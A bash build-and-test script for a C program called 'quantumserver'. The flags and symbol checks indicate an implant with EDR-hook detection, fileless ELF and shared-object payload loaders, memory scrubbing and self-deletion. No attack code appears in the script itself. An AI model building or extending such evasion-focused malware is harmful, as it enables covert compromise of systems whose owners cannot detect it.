#!/bin/bash

set -e

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
PROJECT_DIR="$SCRIPT_DIR/.."
cd "$PROJECT_DIR"

echo "========================================"
echo "QuantumForge Compilation Test"
echo "========================================"
echo ""

echo "[*] Checking for required libraries..."
for lib in crypto ssl curl; do
    if ! ldconfig -p | grep -q "lib${lib}.so"; then
        echo "[!] Warning: lib${lib} may not be installed"
    else
        echo "[+] lib${lib} found"
    fi
done
echo ""

echo "[*] Attempting compilation with full flags..."
gcc -o quantumserver quantumserver.c \
    -lcrypto -lssl -lcurl -ldl \
    -D_GNU_SOURCE \
    -Wall -Wextra \
    -Wno-unused-parameter \
    -Wno-unused-variable \
    2>&1 | tee compile.log

if [ $? -eq 0 ] && [ -f quantumserver ]; then
    echo ""
    echo "[+] Compilation successful!"
    echo "[*] Binary: ./quantumserver"
    ls -lh quantumserver
    echo ""
    
    echo "[*] Testing --help flag..."
    ./quantumserver --help
    echo ""
    
    echo "[*] Testing --test-mode..."
    timeout 3 ./quantumserver --test-mode --no-doh --no-selfdelete 2>&1 | head -20
    echo ""
    
    echo "[+] Basic functionality verified"
    echo ""
    
    echo "[*] Checking for implemented enhancements..."
    if nm quantumserver | grep -q "check_edr_hooks"; then
        echo "[+] EDR hook detection: Found"
    fi
    if nm quantumserver | grep -q "load_elf_execveat"; then
        echo "[+] ELF execveat loader: Found"
    fi
    if nm quantumserver | grep -q "load_so_payload"; then
        echo "[+] SO loader: Found"
    fi
    if nm quantumserver | grep -q "scrub_memory_region"; then
        echo "[+] Memory scrubbing: Found"
    fi
    if nm quantumserver | grep -q "unlink_self"; then
        echo "[+] Self-delete: Found"
    fi
    echo ""
    
    rm -f quantumserver
    echo "[*] Cleaned up test binary"
else
    echo ""
    echo "[!] Compilation failed. Check compile.log for details."
    echo ""
    echo "[*] Last 30 lines of output:"
    tail -30 compile.log
    exit 1
fi

echo ""
echo "[+] Compilation test completed successfully"
